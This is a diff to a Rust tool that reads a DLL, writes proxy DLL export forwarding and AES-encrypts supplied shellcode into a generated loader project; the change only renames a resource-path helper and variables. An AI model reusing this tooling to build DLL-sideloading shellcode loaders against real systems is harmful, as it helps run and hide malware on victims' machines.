@@ -38,10 +38,10 @@ fn join_vec(nums: &[u8], sep: &str) -> String {
         .join(sep)
 }
 
-fn load_resource_file(resource_path: &mut std::path::PathBuf, filename: &str) -> std::io::Result<String> {
-    resource_path.push(filename);
-    let content = fs::read_to_string(&resource_path)?;
-    resource_path.pop();
+fn load_asset_file(asset_path: &mut std::path::PathBuf, filename: &str) -> std::io::Result<String> {
+    asset_path.push(filename);
+    let content = fs::read_to_string(&asset_path)?;
+    asset_path.pop();
     Ok(content)
 }
 
@@ -70,12 +70,12 @@ fn encrypt_aes(shellcode: &mut Vec<u8>) -> EncArgs {
 fn get_encryption_algo(
     encryption: &Option<String>,
     shellcode: &mut Vec<u8>,
-    resource_path: &mut std::path::PathBuf,
+    asset_path: &mut std::path::PathBuf,
 ) -> std::io::Result<String> {
     if let Some(encryption_type) = encryption {
         if encryption_type.to_lowercase() == "aes" {
             println!("Using AES encryption");
-            let enc_algo_template = load_resource_file(resource_path, "aes.rs")?;
+            let enc_algo_template = load_asset_file(asset_path, "aes.rs")?;
             let encryption_args = encrypt_aes(shellcode);
             Ok(enc_algo_template
                 .replace("{KEY}", join_vec(&encryption_args.key, ",").as_str())
@@ -105,7 +105,7 @@ fn main() -> std::io::Result<()> {
     };
 
     let mut output = args.output.unwrap_or_else(|| std::path::PathBuf::from("output"));
-    let mut resource_path = args.resources.unwrap_or_else(|| std::path::PathBuf::from(".\\."));
+    let mut asset_path = args.resources.unwrap_or_else(|| std::path::PathBuf::from("assets"));
 
     let dll_data = fs::read(&args.dll).expect("Could not read dll file");
 
@@ -136,18 +136,18 @@ fn main() -> std::io::Result<()> {
         })
         .collect::<String>();
 
-    let export_asm_template = load_resource_file(&mut resource_path, "export.rs")?;
+    let export_asm_template = load_asset_file(&mut asset_path, "export.rs")?;
     let export_asm = export_asm_template.replace("{}", function_exports.as_str());
 
-    let template_content = load_resource_file(&mut resource_path, "template.rs")?;
+    let template_content = load_asset_file(&mut asset_path, "template.rs")?;
 
     fs::create_dir(&output)?;
 
     let mut shellcode_stub_template = String::new();
     if !shellcode.is_empty() {
-        let encryption_algo = get_encryption_algo(&args.encryption, &mut shellcode, &mut resource_path)?;
+        let encryption_algo = get_encryption_algo(&args.encryption, &mut shellcode, &mut asset_path)?;
 
-        let shellcode_template = load_resource_file(&mut resource_path, "shellcode_template.rs")?;
+        let shellcode_template = load_asset_file(&mut asset_path, "shellcode_template.rs")?;
         let shellcode_str = join_vec(&shellcode, ",");
 
         let shellcode_output = shellcode_template
@@ -156,7 +156,7 @@ fn main() -> std::io::Result<()> {
 
         write_output_file(&mut output, "shellcode.rs", shellcode_output.as_bytes())?;
 
-        shellcode_stub_template = load_resource_file(&mut resource_path, "shellcode_stub.rs")?;
+        shellcode_stub_template = load_asset_file(&mut asset_path, "shellcode_stub.rs")?;
         shellcode_stub_template = shellcode_stub_template.replace("{ENC}", &encryption_algo);
     }
 
@@ -165,16 +165,16 @@ fn main() -> std::io::Result<()> {
         .replace("{SHELLCODE_STUB}", &shellcode_stub_template);
     write_output_file(&mut output, "proxy.rs", proxy_output.as_bytes())?;
 
-    // Copy build files from resources
+    // Copy build files from assets
     output.push("build.rs");
-    resource_path.push("build.rs");
-    fs::copy(&resource_path, &output).expect("Could not create build.rs");
+    asset_path.push("build.rs");
+    fs::copy(&asset_path, &output).expect("Could not create build.rs");
     output.pop();
-    resource_path.pop();
+    asset_path.pop();
 
     output.push("Cargo.toml");
-    resource_path.push("Cargo.toml");
-    fs::copy(&resource_path, &output).expect("Could not create Cargo.toml");
+    asset_path.push("Cargo.toml");
+    fs::copy(&asset_path, &output).expect("Could not create Cargo.toml");
 
     Ok(())
 }
